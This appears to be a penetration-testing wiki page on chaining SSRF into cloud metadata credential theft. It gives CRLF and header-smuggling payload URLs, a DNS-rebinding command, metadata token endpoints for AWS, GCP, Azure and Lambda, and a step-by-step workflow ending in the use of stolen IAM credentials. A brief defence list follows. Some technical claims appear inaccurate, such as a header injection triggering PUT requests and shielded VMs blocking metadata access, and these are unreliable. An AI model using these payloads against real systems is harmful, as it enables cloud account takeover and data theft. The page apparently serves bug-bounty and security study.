---
title: SSRF to cloud — advanced chains
slug: ssrf-to-cloud-advanced-chains
aliases: [ssrf-cloud-advanced, ssrf-metadata-advanced]
---

{% raw %}

> **TL;DR:** SSRF → cloud metadata is a permanent classic, but defences shifted: AWS IMDSv2 requires PUT/token; GCP/Azure require special headers. Modern chains bypass these via (1) IMDSv2 PUT-via-CRLF or header smuggling, (2) GCP `Metadata-Flavor: Google` injection through proxies, (3) Azure `Metadata: true` header smuggling, (4) DNS rebinding to metadata IP, (5) link-local v6 (`fe80::a9fe:a9fe`), (6) provider-specific endpoints (AWS Lambda runtime API, GCP attached service accounts, Azure Managed Identity overlap). Companion to [[ssrf-to-cloud]] and [[aws-imds-ssrf-pivot]].

## Refresher — the targets

| Cloud | Metadata IP | Header required |
|---|---|---|
| AWS | 169.254.169.254 | IMDSv2: `X-aws-ec2-metadata-token` (PUT first) |
| GCP | 169.254.169.254 | `Metadata-Flavor: Google` |
| Azure | 169.254.169.254 | `Metadata: true` |
| Oracle | 169.254.169.254 | `Authorization: Bearer Oracle` |
| Alibaba | 100.100.100.200 | none historically; recent change |
| DigitalOcean | 169.254.169.254 | none |

Plus v6 link-local: `fe80::a9fe:a9fe`.

## Bypass 1 — IMDSv2 via SSRF that controls HTTP method

IMDSv2 requires:
```
PUT /latest/api/token HTTP/1.1
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Then:
```
GET /latest/meta-data/iam/security-credentials/ROLE HTTP/1.1
X-aws-ec2-metadata-token: <token>
```

Most SSRF primitives in apps issue GET requests. If the app's HTTP client lets you control:
- **Method** via parameter (`url=https://...&method=PUT`) → direct PUT.
- **Headers** via header-injection (CRLF in URL parameter that flows into a `Host:` or other header) → embed `X-aws-ec2-metadata-token-ttl-seconds: 21600` to trigger PUT semantics on permissive servers.

CRLF in a URL parameter:
```
http://169.254.169.254/latest/api/token%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0a%0d%0a
```

Some HTTP clients normalise CRLF; some don't.

## Bypass 2 — GCP `Metadata-Flavor: Google` injection

If the app appends a fixed header to outgoing requests and the SSRF lets you control any header value reaching the proxy, smuggle:

```
url=http://169.254.169.254/?x=1%0d%0aMetadata-Flavor:%20Google
```

Some HTTP clients downstream pick this up as a real header.

## Bypass 3 — DNS rebinding to metadata IP

App's WAF blocks the metadata IP. Attacker hosts a domain:
- TTL=1 second.
- First resolution: attacker IP (passes WAF check).
- Second resolution (after app fetches "/check" to validate): 169.254.169.254.

App's HTTP library resolves twice; the second hit reaches metadata.

```bash
# minimal DNS server that flips
python3 dns-rebind.py --first 1.2.3.4 --second 169.254.169.254
```

Many SSRF defences rely on a *single* resolution at filter time; DNS rebind defeats them.

## Bypass 4 — IPv6 link-local

```
http://[fe80::a9fe:a9fe%25eth0]/computeMetadata/v1/
```

Some WAFs ignore v6 entirely.

## Bypass 5 — provider-specific endpoints beyond IMDS

### AWS Lambda runtime API

Lambda functions can call:
```
http://localhost:9001/2018-06-01/runtime/invocation/next
http://AWS_LAMBDA_RUNTIME_API/2018-06-01/...
```

Env var `AWS_LAMBDA_RUNTIME_API` is the local proxy. SSRF inside a Lambda reaching this endpoint can:
- Read invocation payloads (data leak).
- Inject responses (corrupt other concurrent invocations).
- Read environment (`/2018-06-01/runtime/invocation/next` returns full payload).

### GCP attached service accounts

```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Returns OAuth2 access token for the VM's attached service account. Scoped per gcloud config.

### Azure Managed Identity

```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net
```

Different `resource` parameter returns tokens for different Azure services (Key Vault, Storage, ARM). One SSRF → enumerate available identities → request tokens for each.

## Bypass 6 — privatised metadata reachability

Some orgs block 169.254.169.254 at firewall on the app subnet but the SSRF runs from an admin host where it's still reachable. Try job-runner / cron workers / data-import services that have escaped the block.

## Bypass 7 — second-order SSRF via webhook callbacks

The app sends webhooks to user-configured URLs. Attacker:
- Configures webhook URL to `http://169.254.169.254/latest/meta-data/...`.
- Triggers webhook.
- Webhook response logged to a place attacker can read (event log, retry queue).

Many webhook implementations log response bodies on failure.

## Bypass 8 — SSRF in cloud-managed services

Multi-tenant cloud services have their own internal endpoints:
- **CloudFront origin shield** — internal IP for cache fill.
- **Azure App Service SCM** — `https://yourapp.scm.azurewebsites.net` exposes admin features.
- **AWS API Gateway** — `https://localhost.<region>.amazonaws.com` (specific to integration).

SSRF in a customer's app running in these environments often reaches the platform's internal control plane.

## Bypass 9 — SSRF via HTTP/2 / HTTP/3

App's HTTP client speaks HTTP/2. Attacker injects HTTP/2 pseudo-headers that override URL:
- `:authority` (the host).
- `:path` (the URL path).

If app builds the request from user input without sanitising, attacker can override the destination.

## Exploitation workflow

1. Confirm SSRF reaches the metadata IP.
2. Determine which provider (try all three header variants).
3. For IMDSv2, find a method-control or header-smuggle primitive.
4. Extract IAM credentials.
5. Use credentials (aws / gcloud / az CLI with stolen creds).
6. Pivot — assume-role chains ([[aws-assumerole-chains]]), service-account hops ([[gcp-metadata-token-theft]]).

## Detection / defence (provider-side)

- **AWS**: enforce IMDSv2 across the org via SCP; reject IMDSv1 at provisioning.
- **GCP**: shielded VMs reject metadata access from non-init contexts.
- **Azure**: deny IMDS access from non-system identities.
- **All**: NetworkPolicies / iptables blocking 169.254.169.254 from app processes.
- **App-side**: HTTP client with explicit destination allowlist; reject 169.254/16, RFC1918, link-local.

## Real-world bounties

- Capital One 2019 — SSRF + IMDSv1 → S3 credentials → 100M records.
- Multiple FAANG bounties — IMDS bypass via creative HTTP smuggling.
- Cloud customer projects regularly find SSRF → metadata; bounties $1k-$50k.

## References
- [PortSwigger — SSRF labs](https://portswigger.net/web-security/ssrf)
- [Cloud Sec Reading — IMDSv2 bypass research](https://blog.christophetd.fr/) (research index)
- [AWS — IMDSv2 documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [GCP — Metadata server security](https://cloud.google.com/compute/docs/metadata/overview)
- [Sven Geier — SSRF bug bounty case studies](https://blog.0day.rocks/)
- See also: [[ssrf]], [[ssrf-to-cloud]], [[aws-imds-ssrf-pivot]], [[aws-assumerole-chains]], [[gcp-metadata-token-theft]], [[azure-managed-identity-abuse]]

{% endraw %}
